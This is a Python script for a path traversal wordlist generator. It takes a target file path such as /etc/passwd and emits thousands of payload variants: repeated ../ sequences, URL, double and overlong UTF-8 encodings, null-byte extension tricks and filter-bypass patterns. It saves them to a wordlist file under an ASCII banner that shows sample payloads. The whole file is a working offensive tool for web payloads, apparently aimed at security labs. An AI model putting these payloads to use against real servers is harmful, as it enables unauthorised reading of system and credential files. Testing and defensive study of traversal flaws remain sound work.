import urllib.parse
import itertools
import sys
from colorama import Fore, Style, init
import signal

# Initialize Colorama for cross-platform color support
init()

# Function to handle program interruptions gracefully
def handle_exit(signal_received, frame):
    print(f"\n{Fore.RED}Program interrupted. Exiting gracefully...{Style.RESET_ALL}")
    sys.exit(0)

# Register the signal handler for interrupt signals
signal.signal(signal.SIGINT, handle_exit)

def generate_traversal_payloads(target_file):
    # Different traversal depths and non-traversal variations
    traversal_depths = ["../" * i for i in range(1, 10)] + ["..\\"] * 10 + ["\\..\\"] * 10 + ["|../" * i for i in range(1, 5)]
    
    # Split the target file path into segments
    path_segments = target_file.strip('/').split('/')
    
    # Ensure there are enough segments to avoid index errors
    if len(path_segments) < 1:
        print(f"{Fore.RED}Error: The target file path must contain at least one segment.{Style.RESET_ALL}")
        return []

    # Generate more payloads using the path segments
    segment_payloads = [segment for segment in path_segments]
    
    # Additional patterns for bypass techniques
    traversal_patterns = [
        "{depth}{file}", "{depth}/{file}", "{depth}\\/{file}", "{depth}\\{file}", "{depth}//{file}", "{depth}\\..\\{file}",
        "{depth}/%2e%2e/{file}", "{depth}%5c%2e%2e%5c{file}", "{depth}%5c{file}", "{depth}%252e%252e%252f{file}",
        "{depth}%5c%2e%2e/{file}", "{depth}%c0%af{file}", "{depth}%c1%9c/{file}"
    ]

    # Additional payloads without ".", "/", or "\"
    additional_payloads = [
        f"secret/{target_file}", f"hidden{target_file}", f"config{target_file}", f"admin{target_file}", 
        f"private{target_file}", f"data{target_file}", f"backup{target_file}", f"temp{target_file}"
    ]

    # Encodings for file path
    file_encodings = [
        lambda x: x, lambda x: urllib.parse.quote(x), lambda x: urllib.parse.quote_plus(x),
        lambda x: urllib.parse.quote(x).replace("%", "%25"), lambda x: ''.join(f"%{hex(ord(c))[2:]}" for c in x),
        lambda x: ''.join(f"\\{c}" for c in x), lambda x: ''.join(f"%5c{c}" for c in x)
    ]
    
    payloads = set()
    for depth, pattern in itertools.product(traversal_depths, traversal_patterns):
        for encode_file in file_encodings:
            encoded_file = encode_file(target_file)
            payload = pattern.format(depth=depth, file=encoded_file)
            payloads.add(payload)

            # Add encoded variants of depth
            encoded_depth = encode_file(depth)
            payload_with_encoded_depth = pattern.format(depth=encoded_depth, file=encoded_file)
            payloads.add(payload_with_encoded_depth)

    # Adding additional payloads with encoded prefix
    for encode_file in file_encodings:
        encoded_file = encode_file(target_file)
        for add_payload in additional_payloads:
            encoded_add_payload = encode_file(add_payload)
            payloads.add(encoded_add_payload)

    # New variations avoiding "/", "\", and "."
    no_slash_dot_payloads = [
        f"|{segment}" for segment in segment_payloads
    ]

    # Variants with file extensions using the path segments
    file_extension_payloads = []
    if len(path_segments) >= 3:
        file_extension_payloads += [
            f"../../../{path_segments[1]}/{path_segments[2]}%00.png",
            f"../../../{path_segments[1]}/{path_segments[2]}%0A.jpg",
            f"../../../{path_segments[1]}/{path_segments[2]}%20.jpg",
            f"/var/www/images/../../../{path_segments[-1]}",
            f"/var/www/images/../../../../{path_segments[-1]}",
            f"....//....//....//{path_segments[2]}",
            f"....//....//....//{path_segments[2]}%00.txt",
        ]

    # Add new payloads to the set
    for payload in no_slash_dot_payloads:
        payloads.add(payload)
    for payload in file_extension_payloads:
        payloads.add(payload)

    return sorted(payloads)

def save_payloads_to_file(payloads, filename="wordlist.txt"):
    with open(filename, "w") as f:
        for payload in payloads:
            f.write(payload + "\n")
    print(f"\n{Fore.GREEN}Wordlist saved to {filename}{Style.RESET_ALL}")

def display_ascii_art():
    ascii_art = f"""
{Fore.LIGHTMAGENTA_EX}{Style.BRIGHT}
     ______________
    |              |=-| =%2e%2e%2F%2e%2e%2F%2e%2e%2F{Fore.RESET}{Fore.BLUE}{Style.BRIGHT}
    |  PATH TRAV   |=-| =../../etc/passwd{Fore.RESET}{Fore.LIGHTGREEN_EX}
    |   GENERATOR  |=-| ..//home//carlos//secret
    |______________|{Fore.RESET}
    (\\__/) ||
    (•ㅅ•) || {Fore.LIGHTRED_EX}Stay lazy...{Fore.RESET}{Fore.GREEN}
    / 　 づ
    |    |
{Style.RESET_ALL}
"""
    print(ascii_art)

def main():
    display_ascii_art()
    target_file = input(f"{Fore.LIGHTYELLOW_EX}{Style.BRIGHT}Enter the target file path (e.g., /etc/passwd): {Style.RESET_ALL}")
    filename = input(f"{Fore.LIGHTYELLOW_EX}{Style.BRIGHT}Enter the filename for the wordlist (default: wordlist.txt): {Style.RESET_ALL}")
    if not filename:
        filename = "wordlist.txt"

    try:
        payloads = generate_traversal_payloads(target_file)
        if payloads:  # Only save if payloads were generated
            save_payloads_to_file(payloads, filename)
            print(f"{Fore.GREEN}All payloads generated successfully!{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()

